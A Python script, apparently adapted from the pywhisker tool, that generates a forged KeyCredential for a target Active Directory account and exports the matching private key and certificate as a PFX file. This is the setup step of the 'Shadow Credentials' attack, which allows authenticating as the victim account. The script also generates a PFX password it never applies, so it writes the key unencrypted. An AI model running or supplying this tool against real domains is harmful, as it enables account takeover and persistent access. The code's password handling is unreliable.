
import sys
import random
import string
# added for PFX-Export w/o pyOpenSSL
from cryptography import x509
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
from cryptography.hazmat.backends import default_backend


# dsinternals
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime


#everything in here was stolen from pywhisker...just kept the relevant parts for generating the cert
#####################################################################################
#  Helper for PFX-Export with cryptography
#####################################################################################
def export_pfx_with_cryptography(pem_cert_file, pem_key_file, pfx_password=None, out_file='cert.pfx'):
    with open(pem_cert_file, 'rb') as f:
        pem_cert_data = f.read()
    with open(pem_key_file, 'rb') as f:
        pem_key_data = f.read()

    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())

    from cryptography.hazmat.primitives import serialization
    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())


    encryption_algo = NoEncryption()
    pfx_data = serialize_key_and_certificates(
        name=b"",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )

    with open(out_file, 'wb') as f:
        f.write(pfx_data)

    print(f"[+] PFX exportiert nach: {out_file}")
    if pfx_password is not None:
        print(f"[i] Passwort für PFX: {pfx_password}")

def main():

    if len(sys.argv) < 2:
        print("Missing target distinguished name. Ex: CN=User,DC=domain,DC=local")
        sys.exit()
    
    dn = sys.argv[1]
    certificate = X509Certificate2(dn, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=dn, currentTime=DateTime())
    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())


    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))

    certificate.ExportPEM(path_to_files=path)
    pem_cert_file = path + "_cert.pem"
    pem_key_file  = path + "_priv.pem"

    out_pfx_file = path + ".pfx"

    print(f"Converting PEM -> PFX with cryptography: {out_pfx_file}")
    export_pfx_with_cryptography(pem_cert_file=pem_cert_file, 
                                    pem_key_file=pem_key_file,
                                    pfx_password=None,
                                    out_file=out_pfx_file)

main()